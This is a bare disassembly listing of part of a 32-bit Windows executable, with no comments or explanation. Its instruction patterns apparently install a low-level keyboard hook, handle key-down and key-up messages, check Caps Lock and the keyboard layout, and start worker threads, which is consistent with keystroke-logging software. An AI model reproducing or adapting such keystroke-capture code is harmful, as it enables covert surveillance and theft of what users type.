  403474:	b8 b8 ff 40 00       	mov    $0x40ffb8,%eax
  403479:	e8 60 c8 00 00       	call   0x40fcde
  40347e:	51                   	push   %ecx
  40347f:	51                   	push   %ecx
  403480:	53                   	push   %ebx
  403481:	56                   	push   %esi
  403482:	57                   	push   %edi
  403483:	89 65 f0             	mov    %esp,-0x10(%ebp)
  403486:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40348a:	33 ff                	xor    %edi,%edi
  40348c:	89 7d ec             	mov    %edi,-0x14(%ebp)
  40348f:	be 98 56 41 00       	mov    $0x415698,%esi
  403494:	8b ce                	mov    %esi,%ecx
  403496:	e8 bb 00 00 00       	call   0x403556
  40349b:	3b f8                	cmp    %eax,%edi
  40349d:	73 55                	jae    0x4034f4
  40349f:	57                   	push   %edi
  4034a0:	8b ce                	mov    %esi,%ecx
  4034a2:	e8 c5 00 00 00       	call   0x40356c
  4034a7:	8b 00                	mov    (%eax),%eax
  4034a9:	3b 45 08             	cmp    0x8(%ebp),%eax
  4034ac:	75 3a                	jne    0x4034e8
  4034ae:	57                   	push   %edi
  4034af:	8b ce                	mov    %esi,%ecx
  4034b1:	e8 b6 00 00 00       	call   0x40356c
  4034b6:	8b 40 08             	mov    0x8(%eax),%eax
  4034b9:	ff 30                	push   (%eax)
  4034bb:	e8 60 ca 00 00       	call   0x40ff20
  4034c0:	6a 00                	push   $0x0
  4034c2:	57                   	push   %edi
  4034c3:	8b ce                	mov    %esi,%ecx
  4034c5:	e8 a2 00 00 00       	call   0x40356c
  4034ca:	ff 70 04             	push   0x4(%eax)
  4034cd:	ff 15 68 01 41 00    	call   *0x410168
  4034d3:	8b ce                	mov    %esi,%ecx
  4034d5:	e8 59 51 00 00       	call   0x408633
  4034da:	8d 0c 7f             	lea    (%edi,%edi,2),%ecx
  4034dd:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4034e0:	50                   	push   %eax
  4034e1:	8b ce                	mov    %esi,%ecx
  4034e3:	e8 b1 00 00 00       	call   0x403599
  4034e8:	47                   	inc    %edi
  4034e9:	89 7d ec             	mov    %edi,-0x14(%ebp)
  4034ec:	eb a6                	jmp    0x403494
  4034ee:	b8 f4 34 40 00       	mov    $0x4034f4,%eax
  4034f3:	c3                   	ret
  4034f4:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4034f8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4034fb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403502:	5f                   	pop    %edi
  403503:	5e                   	pop    %esi
  403504:	5b                   	pop    %ebx
  403505:	c9                   	leave
  403506:	c3                   	ret
  403507:	55                   	push   %ebp
  403508:	8b ec                	mov    %esp,%ebp
  40350a:	8b c1                	mov    %ecx,%eax
  40350c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40350f:	8a 09                	mov    (%ecx),%cl
  403511:	88 08                	mov    %cl,(%eax)
  403513:	33 c9                	xor    %ecx,%ecx
  403515:	89 48 04             	mov    %ecx,0x4(%eax)
  403518:	89 48 08             	mov    %ecx,0x8(%eax)
  40351b:	89 48 0c             	mov    %ecx,0xc(%eax)
  40351e:	5d                   	pop    %ebp
  40351f:	c2 04 00             	ret    $0x4
  403522:	56                   	push   %esi
  403523:	8b f1                	mov    %ecx,%esi
  403525:	57                   	push   %edi
  403526:	ff 76 08             	push   0x8(%esi)
  403529:	ff 76 04             	push   0x4(%esi)
  40352c:	e8 a0 00 00 00       	call   0x4035d1
  403531:	8b 4e 04             	mov    0x4(%esi),%ecx
  403534:	8b 46 0c             	mov    0xc(%esi),%eax
  403537:	2b c1                	sub    %ecx,%eax
  403539:	6a 0c                	push   $0xc
  40353b:	99                   	cltd
  40353c:	5f                   	pop    %edi
  40353d:	f7 ff                	idiv   %edi
  40353f:	50                   	push   %eax
  403540:	51                   	push   %ecx
  403541:	8b ce                	mov    %esi,%ecx
  403543:	e8 de 00 00 00       	call   0x403626
  403548:	33 c0                	xor    %eax,%eax
  40354a:	5f                   	pop    %edi
  40354b:	89 46 04             	mov    %eax,0x4(%esi)
  40354e:	89 46 08             	mov    %eax,0x8(%esi)
  403551:	89 46 0c             	mov    %eax,0xc(%esi)
  403554:	5e                   	pop    %esi
  403555:	c3                   	ret
  403556:	8b 51 04             	mov    0x4(%ecx),%edx
  403559:	85 d2                	test   %edx,%edx
  40355b:	75 03                	jne    0x403560
  40355d:	33 c0                	xor    %eax,%eax
  40355f:	c3                   	ret
  403560:	8b 41 08             	mov    0x8(%ecx),%eax
  403563:	6a 0c                	push   $0xc
  403565:	2b c2                	sub    %edx,%eax
  403567:	59                   	pop    %ecx
  403568:	99                   	cltd
  403569:	f7 f9                	idiv   %ecx
  40356b:	c3                   	ret
  40356c:	55                   	push   %ebp
  40356d:	8b ec                	mov    %esp,%ebp
  40356f:	56                   	push   %esi
  403570:	57                   	push   %edi
  403571:	8b f9                	mov    %ecx,%edi
  403573:	e8 de ff ff ff       	call   0x403556
  403578:	8b 75 08             	mov    0x8(%ebp),%esi
  40357b:	3b c6                	cmp    %esi,%eax
  40357d:	77 07                	ja     0x403586
  40357f:	8b cf                	mov    %edi,%ecx
  403581:	e8 6d 00 00 00       	call   0x4035f3
  403586:	8b cf                	mov    %edi,%ecx
  403588:	e8 a6 50 00 00       	call   0x408633
  40358d:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  403590:	5f                   	pop    %edi
  403591:	5e                   	pop    %esi
  403592:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  403595:	5d                   	pop    %ebp
  403596:	c2 04 00             	ret    $0x4
  403599:	55                   	push   %ebp
  40359a:	8b ec                	mov    %esp,%ebp
  40359c:	56                   	push   %esi
  40359d:	57                   	push   %edi
  40359e:	8b 7d 08             	mov    0x8(%ebp),%edi
  4035a1:	8b f1                	mov    %ecx,%esi
  4035a3:	57                   	push   %edi
  4035a4:	e8 8e 50 00 00       	call   0x408637
  4035a9:	50                   	push   %eax
  4035aa:	8d 47 0c             	lea    0xc(%edi),%eax
  4035ad:	50                   	push   %eax
  4035ae:	e8 bb 00 00 00       	call   0x40366e
  4035b3:	8b 46 08             	mov    0x8(%esi),%eax
  4035b6:	83 c4 0c             	add    $0xc,%esp
  4035b9:	8b ce                	mov    %esi,%ecx
  4035bb:	50                   	push   %eax
  4035bc:	83 c0 f4             	add    $0xfffffff4,%eax
  4035bf:	50                   	push   %eax
  4035c0:	e8 0c 00 00 00       	call   0x4035d1
  4035c5:	83 46 08 f4          	addl   $0xfffffff4,0x8(%esi)
  4035c9:	8b c7                	mov    %edi,%eax
  4035cb:	5f                   	pop    %edi
  4035cc:	5e                   	pop    %esi
  4035cd:	5d                   	pop    %ebp
  4035ce:	c2 04 00             	ret    $0x4
  4035d1:	55                   	push   %ebp
  4035d2:	8b ec                	mov    %esp,%ebp
  4035d4:	56                   	push   %esi
  4035d5:	8b 75 08             	mov    0x8(%ebp),%esi
  4035d8:	57                   	push   %edi
  4035d9:	8b f9                	mov    %ecx,%edi
  4035db:	3b 75 0c             	cmp    0xc(%ebp),%esi
  4035de:	74 0d                	je     0x4035ed
  4035e0:	56                   	push   %esi
  4035e1:	8b cf                	mov    %edi,%ecx
  4035e3:	e8 4e 00 00 00       	call   0x403636
  4035e8:	83 c6 0c             	add    $0xc,%esi
  4035eb:	eb ee                	jmp    0x4035db
  4035ed:	5f                   	pop    %edi
  4035ee:	5e                   	pop    %esi
  4035ef:	5d                   	pop    %ebp
  4035f0:	c2 08 00             	ret    $0x8
  4035f3:	55                   	push   %ebp
  4035f4:	8b ec                	mov    %esp,%ebp
  4035f6:	83 ec 30             	sub    $0x30,%esp
  4035f9:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4035fc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4035ff:	50                   	push   %eax
  403600:	68 64 05 41 00       	push   $0x410564
  403605:	ff 15 4c 02 41 00    	call   *0x41024c
  40360b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40360e:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  403611:	50                   	push   %eax
  403612:	ff 15 48 02 41 00    	call   *0x410248
  403618:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40361b:	68 f0 19 41 00       	push   $0x4119f0
  403620:	50                   	push   %eax
  403621:	e8 62 c6 00 00       	call   0x40fc88
  403626:	55                   	push   %ebp
  403627:	8b ec                	mov    %esp,%ebp
  403629:	ff 75 08             	push   0x8(%ebp)
  40362c:	e8 fb c5 00 00       	call   0x40fc2c
  403631:	59                   	pop    %ecx
  403632:	5d                   	pop    %ebp
  403633:	c2 08 00             	ret    $0x8
  403636:	55                   	push   %ebp
  403637:	8b ec                	mov    %esp,%ebp
  403639:	ff 75 08             	push   0x8(%ebp)
  40363c:	e8 55 00 00 00       	call   0x403696
  403641:	59                   	pop    %ecx
  403642:	5d                   	pop    %ebp
  403643:	c2 04 00             	ret    $0x4
  403646:	55                   	push   %ebp
  403647:	8b ec                	mov    %esp,%ebp
  403649:	56                   	push   %esi
  40364a:	8b 75 08             	mov    0x8(%ebp),%esi
  40364d:	3b 75 0c             	cmp    0xc(%ebp),%esi
  403650:	74 16                	je     0x403668
  403652:	0f b7 06             	movzwl (%esi),%eax
  403655:	50                   	push   %eax
  403656:	ff 55 14             	call   *0x14(%ebp)
  403659:	59                   	pop    %ecx
  40365a:	46                   	inc    %esi
  40365b:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40365e:	46                   	inc    %esi
  40365f:	83 45 10 02          	addl   $0x2,0x10(%ebp)
  403663:	66 89 01             	mov    %ax,(%ecx)
  403666:	eb e5                	jmp    0x40364d
  403668:	8b 45 10             	mov    0x10(%ebp),%eax
  40366b:	5e                   	pop    %esi
  40366c:	5d                   	pop    %ebp
  40366d:	c3                   	ret
  40366e:	55                   	push   %ebp
  40366f:	8b ec                	mov    %esp,%ebp
  403671:	8b 45 08             	mov    0x8(%ebp),%eax
  403674:	3b 45 0c             	cmp    0xc(%ebp),%eax
  403677:	74 18                	je     0x403691
  403679:	56                   	push   %esi
  40367a:	57                   	push   %edi
  40367b:	8b 7d 10             	mov    0x10(%ebp),%edi
  40367e:	8b f0                	mov    %eax,%esi
  403680:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403681:	83 45 10 0c          	addl   $0xc,0x10(%ebp)
  403685:	83 c0 0c             	add    $0xc,%eax
  403688:	3b 45 0c             	cmp    0xc(%ebp),%eax
  40368b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40368c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40368d:	75 ec                	jne    0x40367b
  40368f:	5f                   	pop    %edi
  403690:	5e                   	pop    %esi
  403691:	8b 45 10             	mov    0x10(%ebp),%eax
  403694:	5d                   	pop    %ebp
  403695:	c3                   	ret
  403696:	c3                   	ret
  403697:	e8 05 00 00 00       	call   0x4036a1
  40369c:	e9 0a 00 00 00       	jmp    0x4036ab
  4036a1:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  4036a6:	e9 48 00 00 00       	jmp    0x4036f3
  4036ab:	68 b7 36 40 00       	push   $0x4036b7
  4036b0:	e8 05 c6 00 00       	call   0x40fcba
  4036b5:	59                   	pop    %ecx
  4036b6:	c3                   	ret
  4036b7:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  4036bc:	e9 00 00 00 00       	jmp    0x4036c1
  4036c1:	56                   	push   %esi
  4036c2:	8b f1                	mov    %ecx,%esi
  4036c4:	8d 4e 70             	lea    0x70(%esi),%ecx
  4036c7:	ff 15 54 02 41 00    	call   *0x410254
  4036cd:	8d 4e 60             	lea    0x60(%esi),%ecx
  4036d0:	ff 15 54 02 41 00    	call   *0x410254
  4036d6:	8d 4e 50             	lea    0x50(%esi),%ecx
  4036d9:	ff 15 54 02 41 00    	call   *0x410254
  4036df:	8d 4e 14             	lea    0x14(%esi),%ecx
  4036e2:	ff 15 54 02 41 00    	call   *0x410254
  4036e8:	8d 4e 04             	lea    0x4(%esi),%ecx
  4036eb:	ff 15 54 02 41 00    	call   *0x410254
  4036f1:	5e                   	pop    %esi
  4036f2:	c3                   	ret
  4036f3:	55                   	push   %ebp
  4036f4:	8b ec                	mov    %esp,%ebp
  4036f6:	51                   	push   %ecx
  4036f7:	56                   	push   %esi
  4036f8:	8b f1                	mov    %ecx,%esi
  4036fa:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4036fd:	50                   	push   %eax
  4036fe:	8d 4e 04             	lea    0x4(%esi),%ecx
  403701:	ff 15 50 02 41 00    	call   *0x410250
  403707:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40370a:	8d 4e 14             	lea    0x14(%esi),%ecx
  40370d:	50                   	push   %eax
  40370e:	ff 15 50 02 41 00    	call   *0x410250
  403714:	8d 45 ff             	lea    -0x1(%ebp),%eax
  403717:	8d 4e 50             	lea    0x50(%esi),%ecx
  40371a:	50                   	push   %eax
  40371b:	ff 15 50 02 41 00    	call   *0x410250
  403721:	8d 45 ff             	lea    -0x1(%ebp),%eax
  403724:	8d 4e 60             	lea    0x60(%esi),%ecx
  403727:	50                   	push   %eax
  403728:	ff 15 50 02 41 00    	call   *0x410250
  40372e:	8d 45 ff             	lea    -0x1(%ebp),%eax
  403731:	8d 4e 70             	lea    0x70(%esi),%ecx
  403734:	50                   	push   %eax
  403735:	ff 15 50 02 41 00    	call   *0x410250
  40373b:	33 c0                	xor    %eax,%eax
  40373d:	89 06                	mov    %eax,(%esi)
  40373f:	88 46 38             	mov    %al,0x38(%esi)
  403742:	88 46 39             	mov    %al,0x39(%esi)
  403745:	8b c6                	mov    %esi,%eax
  403747:	5e                   	pop    %esi
  403748:	c9                   	leave
  403749:	c3                   	ret
  40374a:	56                   	push   %esi
  40374b:	8b f1                	mov    %ecx,%esi
  40374d:	6a 00                	push   $0x0
  40374f:	ff 15 58 04 41 00    	call   *0x410458
  403755:	6a 09                	push   $0x9
  403757:	25 ff 03 00 00       	and    $0x3ff,%eax
  40375c:	59                   	pop    %ecx
  40375d:	66 3b c1             	cmp    %cx,%ax
  403760:	74 0d                	je     0x40376f
  403762:	6a 10                	push   $0x10
  403764:	5a                   	pop    %edx
  403765:	66 3b c2             	cmp    %dx,%ax
  403768:	75 05                	jne    0x40376f
  40376a:	89 56 34             	mov    %edx,0x34(%esi)
  40376d:	5e                   	pop    %esi
  40376e:	c3                   	ret
  40376f:	89 4e 34             	mov    %ecx,0x34(%esi)
  403772:	5e                   	pop    %esi
  403773:	c3                   	ret
  403774:	55                   	push   %ebp
  403775:	8b ec                	mov    %esp,%ebp
  403777:	53                   	push   %ebx
  403778:	56                   	push   %esi
  403779:	8b f1                	mov    %ecx,%esi
  40377b:	8d 45 08             	lea    0x8(%ebp),%eax
  40377e:	57                   	push   %edi
  40377f:	50                   	push   %eax
  403780:	8d 4e 50             	lea    0x50(%esi),%ecx
  403783:	c6 46 38 01          	movb   $0x1,0x38(%esi)
  403787:	ff 15 64 02 41 00    	call   *0x410264
  40378d:	8b ce                	mov    %esi,%ecx
  40378f:	e8 b6 ff ff ff       	call   0x40374a
  403794:	8b 1d 98 01 41 00    	mov    0x410198,%ebx
  40379a:	33 ff                	xor    %edi,%edi
  40379c:	57                   	push   %edi
  40379d:	57                   	push   %edi
  40379e:	56                   	push   %esi
  40379f:	68 2c 38 40 00       	push   $0x40382c
  4037a4:	57                   	push   %edi
  4037a5:	57                   	push   %edi
  4037a6:	ff d3                	call   *%ebx
  4037a8:	39 3e                	cmp    %edi,(%esi)
  4037aa:	75 0c                	jne    0x4037b8
  4037ac:	57                   	push   %edi
  4037ad:	57                   	push   %edi
  4037ae:	56                   	push   %esi
  4037af:	68 0c 38 40 00       	push   $0x40380c
  4037b4:	57                   	push   %edi
  4037b5:	57                   	push   %edi
  4037b6:	ff d3                	call   *%ebx
  4037b8:	57                   	push   %edi
  4037b9:	57                   	push   %edi
  4037ba:	56                   	push   %esi
  4037bb:	68 3b 38 40 00       	push   $0x40383b
  4037c0:	57                   	push   %edi
  4037c1:	57                   	push   %edi
  4037c2:	ff d3                	call   *%ebx
  4037c4:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4037c7:	ff 15 54 02 41 00    	call   *0x410254
  4037cd:	5f                   	pop    %edi
  4037ce:	5e                   	pop    %esi
  4037cf:	5b                   	pop    %ebx
  4037d0:	5d                   	pop    %ebp
  4037d1:	c2 10 00             	ret    $0x10
  4037d4:	55                   	push   %ebp
  4037d5:	8b ec                	mov    %esp,%ebp
  4037d7:	56                   	push   %esi
  4037d8:	8b f1                	mov    %ecx,%esi
  4037da:	8d 45 08             	lea    0x8(%ebp),%eax
  4037dd:	50                   	push   %eax
  4037de:	8d 4e 50             	lea    0x50(%esi),%ecx
  4037e1:	ff 15 64 02 41 00    	call   *0x410264
  4037e7:	33 c0                	xor    %eax,%eax
  4037e9:	38 46 38             	cmp    %al,0x38(%esi)
  4037ec:	75 10                	jne    0x4037fe
  4037ee:	50                   	push   %eax
  4037ef:	50                   	push   %eax
  4037f0:	56                   	push   %esi
  4037f1:	68 1b 38 40 00       	push   $0x40381b
  4037f6:	50                   	push   %eax
  4037f7:	50                   	push   %eax
  4037f8:	ff 15 98 01 41 00    	call   *0x410198
  4037fe:	8d 4d 08             	lea    0x8(%ebp),%ecx
  403801:	ff 15 54 02 41 00    	call   *0x410254
  403807:	5e                   	pop    %esi
  403808:	5d                   	pop    %ebp
  403809:	c2 10 00             	ret    $0x10
  40380c:	55                   	push   %ebp
  40380d:	8b ec                	mov    %esp,%ebp
  40380f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403812:	e8 60 00 00 00       	call   0x403877
  403817:	5d                   	pop    %ebp
  403818:	c2 04 00             	ret    $0x4
  40381b:	55                   	push   %ebp
  40381c:	8b ec                	mov    %esp,%ebp
  40381e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403821:	e8 62 01 00 00       	call   0x403988
  403826:	33 c0                	xor    %eax,%eax
  403828:	5d                   	pop    %ebp
  403829:	c2 04 00             	ret    $0x4
  40382c:	55                   	push   %ebp
  40382d:	8b ec                	mov    %esp,%ebp
  40382f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403832:	e8 ac 02 00 00       	call   0x403ae3
  403837:	5d                   	pop    %ebp
  403838:	c2 04 00             	ret    $0x4
  40383b:	55                   	push   %ebp
  40383c:	8b ec                	mov    %esp,%ebp
  40383e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403841:	e8 31 08 00 00       	call   0x404077
  403846:	5d                   	pop    %ebp
  403847:	c2 04 00             	ret    $0x4
  40384a:	55                   	push   %ebp
  40384b:	8b ec                	mov    %esp,%ebp
  40384d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403850:	e8 55 0a 00 00       	call   0x4042aa
  403855:	0f b6 c0             	movzbl %al,%eax
  403858:	5d                   	pop    %ebp
  403859:	c2 04 00             	ret    $0x4
  40385c:	55                   	push   %ebp
  40385d:	8b ec                	mov    %esp,%ebp
  40385f:	ff 75 10             	push   0x10(%ebp)
  403862:	ff 75 0c             	push   0xc(%ebp)
  403865:	ff 75 08             	push   0x8(%ebp)
  403868:	ff 35 58 57 41 00    	push   0x415758
  40386e:	e8 68 00 00 00       	call   0x4038db
  403873:	5d                   	pop    %ebp
  403874:	c2 0c 00             	ret    $0xc
  403877:	55                   	push   %ebp
  403878:	8b ec                	mov    %esp,%ebp
  40387a:	83 ec 1c             	sub    $0x1c,%esp
  40387d:	56                   	push   %esi
  40387e:	57                   	push   %edi
  40387f:	8b f1                	mov    %ecx,%esi
  403881:	33 ff                	xor    %edi,%edi
  403883:	89 35 58 57 41 00    	mov    %esi,0x415758
  403889:	39 3e                	cmp    %edi,(%esi)
  40388b:	75 18                	jne    0x4038a5
  40388d:	57                   	push   %edi
  40388e:	57                   	push   %edi
  40388f:	ff 15 90 01 41 00    	call   *0x410190
  403895:	50                   	push   %eax
  403896:	68 5c 38 40 00       	push   $0x40385c
  40389b:	6a 0d                	push   $0xd
  40389d:	ff 15 4c 04 41 00    	call   *0x41044c
  4038a3:	89 06                	mov    %eax,(%esi)
  4038a5:	8b 35 50 04 41 00    	mov    0x410450,%esi
  4038ab:	57                   	push   %edi
  4038ac:	57                   	push   %edi
  4038ad:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4038b0:	57                   	push   %edi
  4038b1:	50                   	push   %eax
  4038b2:	ff d6                	call   *%esi
  4038b4:	85 c0                	test   %eax,%eax
  4038b6:	74 1d                	je     0x4038d5
  4038b8:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4038bb:	50                   	push   %eax
  4038bc:	ff 15 54 04 41 00    	call   *0x410454
  4038c2:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4038c5:	50                   	push   %eax
  4038c6:	ff 15 60 04 41 00    	call   *0x410460
  4038cc:	57                   	push   %edi
  4038cd:	57                   	push   %edi
  4038ce:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4038d1:	57                   	push   %edi
  4038d2:	50                   	push   %eax
  4038d3:	eb dd                	jmp    0x4038b2
  4038d5:	5f                   	pop    %edi
  4038d6:	33 c0                	xor    %eax,%eax
  4038d8:	5e                   	pop    %esi
  4038d9:	c9                   	leave
  4038da:	c3                   	ret
  4038db:	55                   	push   %ebp
  4038dc:	8b ec                	mov    %esp,%ebp
  4038de:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4038e2:	53                   	push   %ebx
  4038e3:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4038e6:	56                   	push   %esi
  4038e7:	8b 75 14             	mov    0x14(%ebp),%esi
  4038ea:	57                   	push   %edi
  4038eb:	6a 05                	push   $0x5
  4038ed:	8d 7b 3c             	lea    0x3c(%ebx),%edi
  4038f0:	59                   	pop    %ecx
  4038f1:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4038f3:	75 7b                	jne    0x403970
  4038f5:	8b 45 10             	mov    0x10(%ebp),%eax
  4038f8:	2d 00 01 00 00       	sub    $0x100,%eax
  4038fd:	74 28                	je     0x403927
  4038ff:	48                   	dec    %eax
  403900:	74 0e                	je     0x403910
  403902:	83 e8 03             	sub    $0x3,%eax
  403905:	75 69                	jne    0x403970
  403907:	8b cb                	mov    %ebx,%ecx
  403909:	e8 d0 16 00 00       	call   0x404fde
  40390e:	eb 60                	jmp    0x403970
  403910:	8b cb                	mov    %ebx,%ecx
  403912:	e8 af 17 00 00       	call   0x4050c6
  403917:	8b cb                	mov    %ebx,%ecx
  403919:	e8 cc 17 00 00       	call   0x4050ea
  40391e:	8b cb                	mov    %ebx,%ecx
  403920:	e8 49 17 00 00       	call   0x40506e
  403925:	eb 49                	jmp    0x403970
  403927:	8b 35 44 04 41 00    	mov    0x410444,%esi
  40392d:	6a 14                	push   $0x14
  40392f:	ff d6                	call   *%esi
  403931:	66 85 c0             	test   %ax,%ax
  403934:	74 10                	je     0x403946
  403936:	6a 14                	push   $0x14
  403938:	ff d6                	call   *%esi
  40393a:	66 3d 80 ff          	cmp    $0xff80,%ax
  40393e:	74 06                	je     0x403946
  403940:	c6 43 2c 01          	movb   $0x1,0x2c(%ebx)
  403944:	eb 04                	jmp    0x40394a
  403946:	80 63 2c 00          	andb   $0x0,0x2c(%ebx)
  40394a:	8b cb                	mov    %ebx,%ecx
  40394c:	e8 63 17 00 00       	call   0x4050b4
  403951:	8b cb                	mov    %ebx,%ecx
  403953:	e8 80 17 00 00       	call   0x4050d8
  403958:	8b cb                	mov    %ebx,%ecx
  40395a:	e8 60 0a 00 00       	call   0x4043bf
  40395f:	80 7b 2f 00          	cmpb   $0x0,0x2f(%ebx)
  403963:	75 07                	jne    0x40396c
  403965:	8b cb                	mov    %ebx,%ecx
  403967:	e8 f3 14 00 00       	call   0x404e5f
  40396c:	80 63 2f 00          	andb   $0x0,0x2f(%ebx)
  403970:	ff 75 14             	push   0x14(%ebp)
  403973:	ff 75 10             	push   0x10(%ebp)
  403976:	ff 75 0c             	push   0xc(%ebp)
  403979:	ff 33                	push   (%ebx)
  40397b:	ff 15 48 04 41 00    	call   *0x410448
  403981:	5f                   	pop    %edi
  403982:	5e                   	pop    %esi
  403983:	5b                   	pop    %ebx
  403984:	5d                   	pop    %ebp
  403985:	c2 10 00             	ret    $0x10
  403988:	55                   	push   %ebp
  403989:	8b ec                	mov    %esp,%ebp
  40398b:	81 ec 20 04 00 00    	sub    $0x420,%esp
  403991:	53                   	push   %ebx
  403992:	8b 1d 8c 01 41 00    	mov    0x41018c,%ebx
  403998:	56                   	push   %esi
  403999:	57                   	push   %edi
  40399a:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40399d:	be 40 59 41 00       	mov    $0x415940,%esi
  4039a2:	80 a5 e0 fb ff ff 00 	andb   $0x0,-0x420(%ebp)
  4039a9:	b9 f9 00 00 00       	mov    $0xf9,%ecx
  4039ae:	33 c0                	xor    %eax,%eax
  4039b0:	8d bd e1 fb ff ff    	lea    -0x41f(%ebp),%edi
  4039b6:	f3 ab                	rep stos %eax,%es:(%edi)
  4039b8:	66 ab                	stos   %ax,%es:(%edi)
  4039ba:	aa                   	stos   %al,%es:(%edi)
  4039bb:	8d 85 e0 fb ff ff    	lea    -0x420(%ebp),%eax
  4039c1:	8b ce                	mov    %esi,%ecx
  4039c3:	50                   	push   %eax
  4039c4:	6a 2a                	push   $0x2a
  4039c6:	e8 be d8 ff ff       	call   0x401289
  4039cb:	83 ec 10             	sub    $0x10,%esp
  4039ce:	8b cc                	mov    %esp,%ecx
  4039d0:	50                   	push   %eax
  4039d1:	ff 15 60 02 41 00    	call   *0x410260
  4039d7:	e8 c7 ba 00 00       	call   0x40f4a3
  4039dc:	83 c4 14             	add    $0x14,%esp
  4039df:	84 c0                	test   %al,%al
  4039e1:	75 09                	jne    0x4039ec
  4039e3:	68 e8 03 00 00       	push   $0x3e8
  4039e8:	ff d3                	call   *%ebx
  4039ea:	eb cf                	jmp    0x4039bb
  4039ec:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4039ef:	68 d8 07 41 00       	push   $0x4107d8
  4039f4:	50                   	push   %eax
  4039f5:	8d 85 e0 fb ff ff    	lea    -0x420(%ebp),%eax
  4039fb:	50                   	push   %eax
  4039fc:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4039ff:	ff 15 4c 02 41 00    	call   *0x41024c
  403a05:	50                   	push   %eax
  403a06:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403a09:	68 d0 07 41 00       	push   $0x4107d0
  403a0e:	50                   	push   %eax
  403a0f:	e8 06 c2 00 00       	call   0x40fc1a
  403a14:	83 c4 0c             	add    $0xc,%esp
  403a17:	50                   	push   %eax
  403a18:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403a1b:	50                   	push   %eax
  403a1c:	e8 ff c1 00 00       	call   0x40fc20
  403a21:	8b 7d f8             	mov    -0x8(%ebp),%edi
  403a24:	83 c4 0c             	add    $0xc,%esp
  403a27:	50                   	push   %eax
  403a28:	8d 4f 04             	lea    0x4(%edi),%ecx
  403a2b:	ff 15 64 02 41 00    	call   *0x410264
  403a31:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403a34:	ff 15 54 02 41 00    	call   *0x410254
  403a3a:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403a3d:	ff 15 54 02 41 00    	call   *0x410254
  403a43:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403a46:	ff 15 54 02 41 00    	call   *0x410254
  403a4c:	83 ec 10             	sub    $0x10,%esp
  403a4f:	8d 47 50             	lea    0x50(%edi),%eax
  403a52:	8b cc                	mov    %esp,%ecx
  403a54:	50                   	push   %eax
  403a55:	ff 15 60 02 41 00    	call   *0x410260
  403a5b:	8b cf                	mov    %edi,%ecx
  403a5d:	e8 12 fd ff ff       	call   0x403774
  403a62:	6a 00                	push   $0x0
  403a64:	6a 2a                	push   $0x2a
  403a66:	8b ce                	mov    %esi,%ecx
  403a68:	e8 1c d8 ff ff       	call   0x401289
  403a6d:	83 ec 10             	sub    $0x10,%esp
  403a70:	8b cc                	mov    %esp,%ecx
  403a72:	50                   	push   %eax
  403a73:	ff 15 60 02 41 00    	call   *0x410260
  403a79:	e8 25 ba 00 00       	call   0x40f4a3
  403a7e:	83 c4 14             	add    $0x14,%esp
  403a81:	84 c0                	test   %al,%al
  403a83:	74 09                	je     0x403a8e
  403a85:	68 e8 03 00 00       	push   $0x3e8
  403a8a:	ff d3                	call   *%ebx
  403a8c:	eb d4                	jmp    0x403a62
  403a8e:	8b cf                	mov    %edi,%ecx
  403a90:	e8 f3 08 00 00       	call   0x404388
  403a95:	e9 08 ff ff ff       	jmp    0x4039a2
  403a9a:	55                   	push   %ebp
  403a9b:	8b ec                	mov    %esp,%ebp
  403a9d:	56                   	push   %esi
  403a9e:	8b f1                	mov    %ecx,%esi
  403aa0:	80 7e 38 00          	cmpb   $0x0,0x38(%esi)
  403aa4:	74 0d                	je     0x403ab3
  403aa6:	8d 45 08             	lea    0x8(%ebp),%eax
  403aa9:	8d 4e 04             	lea    0x4(%esi),%ecx
  403aac:	50                   	push   %eax
  403aad:	ff 15 94 02 41 00    	call   *0x410294
  403ab3:	80 7e 39 00          	cmpb   $0x0,0x39(%esi)
  403ab7:	74 16                	je     0x403acf
  403ab9:	8d 45 08             	lea    0x8(%ebp),%eax
  403abc:	8d 4e 14             	lea    0x14(%esi),%ecx
  403abf:	50                   	push   %eax
  403ac0:	ff 15 94 02 41 00    	call   *0x410294
  403ac6:	ff 76 30             	push   0x30(%esi)
  403ac9:	ff 15 64 01 41 00    	call   *0x410164
  403acf:	8a 45 18             	mov    0x18(%ebp),%al
  403ad2:	8d 4d 08             	lea    0x8(%ebp),%ecx
